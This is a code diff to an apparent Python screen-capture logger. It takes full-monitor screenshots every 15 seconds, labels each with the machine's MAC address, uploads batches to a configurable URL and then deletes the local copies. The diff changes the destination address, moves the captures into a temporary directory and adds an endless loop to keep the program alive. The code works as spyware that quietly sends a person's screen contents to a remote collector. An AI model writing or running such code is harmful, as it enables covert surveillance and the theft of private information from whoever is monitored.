@@ -6,8 +6,9 @@ import os
 from contextlib import ExitStack # to close screenshots properly
 from datetime import datetime, timezone # to classify screenshots by time sent
 from getmac import get_mac_address # to get mac address
+import tempfile # for making a temp folder to store the files
 
-URL = 'http://10.0.2.2:8000' # the URL/IP to which you want to send the logs to
+URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the logs to
 SCREENSHOT_INTERVAL = 15.0 # Interval between taking screenshots (in seconds).
 SEND_COUNT = 2 # How many screenshots need to be taken before sending.
 MAC = get_mac_address().replace(':', '') # store mac address
@@ -18,16 +19,16 @@ screenshots = []
 # Make sure the screenshot&send count combo don't make the sending interval
 # (screenshot interval * send count) too low so you don't DDOS yourself
 
-def screenshot():
+def screenshot(temp_dir):
     with mss.mss() as sct:
         time = str(datetime.now(timezone.utc))[:-13].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
         ss = sct.grab(sct.monitors[0]) # take a screenshot
-        screenshot_name = f"C:/Windows/Temp/screenshot-{time}.png"
+        screenshot_name = f"{temp_dir}\screenshot-{time}.png"
         mss.tools.to_png(ss.rgb, ss.size, output=screenshot_name) # save the screenshot
         screenshots.append(screenshot_name) # add the screenshot to the list
     if len(screenshots) >= SEND_COUNT: # if the number of screenshots has passed the threshhold send the screenshots
         send_screenshot()
-    threading.Timer(SCREENSHOT_INTERVAL, screenshot).start() # make the function run again after the amount of seconds specified in SCREENSHOT_INTERVAL
+    threading.Timer(SCREENSHOT_INTERVAL, screenshot, args=[temp_dir]).start() # make the function run again after the amount of seconds specified in SCREENSHOT_INTERVAL
     
 def send_screenshot():
     count = len(screenshots) # Assume new screenshots were added which you haven't sent yet and log how many you're sending so you know how many to remove later
@@ -46,4 +47,8 @@ def send_screenshot():
             os.remove(file) # remove leftover files
         del screenshots[:count-1] # remove the deleted files from the list
 
-screenshot()
+with tempfile.TemporaryDirectory() as temp_dir:
+    print("Temporary Directory:", temp_dir)
+    screenshot(temp_dir)
+    while True: # while True so the temporary directory doesn't end
+        pass
